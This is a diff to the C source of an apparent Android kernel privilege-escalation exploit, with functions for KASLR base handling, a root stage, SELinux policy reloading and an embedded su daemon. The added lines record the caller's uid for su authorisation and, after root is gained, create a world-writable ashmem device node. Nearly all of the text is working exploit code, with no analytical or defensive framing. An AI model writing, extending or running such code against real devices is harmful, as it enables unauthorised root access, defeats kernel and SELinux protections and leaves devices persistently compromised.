@@ -1,4 +1,5 @@
 #include "common.h"
+#include <sys/sysmacros.h>
 
 uint32_t f_wait;
 uint32_t f_pi_target;
@@ -16,6 +17,7 @@ atomic_int consumer_success;
 atomic_int main_route_delay_usec;
 uint64_t kaslr_base;
 uint64_t kaslr_slide;
+static uid_t exploit_caller_uid = (uid_t)-1;
 
 #define DIRECT_WRITE_ATTEMPTS 3
 
@@ -406,6 +408,42 @@ static int direct_reload_selinux_policy(size_t *policy_size) {
   return 1;
 }
 
+static void direct_fix_ashmem_node(void) {
+  char id[37];
+  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    pr_warning("ashmem boot_id open failed errno=%d\n", errno);
+    return;
+  }
+  ssize_t n = read(fd, id, 36);
+  int saved_errno = errno;
+  close(fd);
+  id[36] = 0;
+  if (n != 36) {
+    pr_warning("ashmem boot_id read failed ret=%zd errno=%d\n", n, saved_errno);
+    return;
+  }
+  for (int i = 0; i < 36; i++) {
+    char c = id[i];
+    if ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || c == '-') {
+      continue;
+    }
+    pr_warning("ashmem boot_id format invalid\n");
+    return;
+  }
+  char path[96];
+  snprintf(path, sizeof(path), "/dev/ashmem%s", id);
+  if (mknod(path, S_IFCHR | 0666, makedev(10, 124)) != 0 && errno != EEXIST) {
+    pr_warning("ashmem mknod failed path=%s errno=%d\n", path, errno);
+    return;
+  }
+  if (chmod(path, 0666) != 0) {
+    pr_warning("ashmem chmod failed path=%s errno=%d\n", path, errno);
+    return;
+  }
+  pr_success("ashmem node ready: %s\n", path);
+}
+
 static int direct_run_id(void) {
   pid_t child = fork();
   if (child < 0) {
@@ -564,6 +602,7 @@ static int run_direct_root_stage(void) {
   } else {
     pr_success("boot_id ctl_table.data restored=%016zx\n",
                canon_addr(SYSCTL_BOOTID_IMAGE));
+    direct_fix_ashmem_node();
   }
 
   if (!restore_initial_affinity()) {
@@ -589,6 +628,13 @@ static int run_direct_root_stage(void) {
              policy_size);
 
   int id_ok = direct_run_id();
+  if (exploit_caller_uid != (uid_t)-1) {
+    char caller_uid[16];
+    snprintf(caller_uid, sizeof(caller_uid), "%u", (unsigned)exploit_caller_uid);
+    if (setenv("HONOR_SU_CALLER_UID", caller_uid, 1) != 0) {
+      pr_warning("cannot record caller uid for su authorization\n");
+    }
+  }
   pid_t su_daemon_pid = -1;
   errno = 0;
   int su_ok = install_embedded_su(&su_daemon_pid);
@@ -604,6 +650,7 @@ static int run_direct_root_stage(void) {
 }
 
 int run_exploit(int argc, char **argv) {
+  exploit_caller_uid = getuid();
   disable_rseq_for_thread();
   set_unbuffer();
   set_limit();
